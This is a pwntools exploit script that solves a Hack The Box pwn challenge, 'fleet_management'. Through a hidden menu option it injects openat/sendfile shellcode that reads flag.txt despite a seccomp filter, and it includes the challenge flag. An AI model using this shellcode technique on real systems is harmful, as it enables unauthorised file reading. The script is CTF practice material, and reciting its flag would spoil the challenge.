#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 4141 ./fleet_management
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fleet_management')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '46.101.59.228'
port = int(args.PORT or 32606)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *beta_feature
b *beta_feature+95
continue
c
c
si
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL);
# seccomp_rule_add(v1, 2147418112LL, 231LL, 0LL);
# seccomp_rule_add(v1, 2147418112LL, 257LL, 0LL); # openat
# seccomp_rule_add(v1, 2147418112LL, 40LL, 0LL); # rmdir
# seccomp_rule_add(v1, 2147418112LL, 15LL, 0LL); # chmod

io.sendlineafter("do? ","9")
shellcode = asm(shellcraft.openat(-100,"./flag.txt",0))
shellcode += asm(shellcraft.sendfile(1,5,0,255))
print(len(shellcode))
io.sendline(shellcode)

# HTB{backd00r_as_a_f3atur3}

io.interactive()

